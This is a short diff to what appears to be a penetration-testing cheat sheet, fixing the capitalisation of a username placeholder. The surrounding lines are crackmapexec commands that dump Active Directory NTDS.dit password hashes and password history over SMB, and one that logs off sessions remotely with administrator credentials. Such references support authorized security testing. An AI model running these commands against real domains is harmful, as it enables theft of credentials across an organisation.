@@ -103,9 +103,9 @@ crackmapexec smb $ip -u 'Administrator' -p 'PASS' -x 'logoff <sessionid>'
 # Uses drsuapi RPC interface create a handle, trigger replication 
 # and combined with additional drsuapi calls to convert the resultant  
 # linked-lists into readable format 
-crackmapexec smb $ip -u UserNAme -p 'PASSWORDHERE' --ntds  
+crackmapexec smb $ip -u UserName -p 'PASSWORDHERE' --ntds  
 # Uses the Volume Shadow copy Service 
-crackmapexec smb $ip -u UserNAme -p 'PASSWORDHERE' --ntds vss  
+crackmapexec smb $ip -u UserName -p 'PASSWORDHERE' --ntds vss  
 # Dump the NTDS.dit password history smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history`
 ```
  
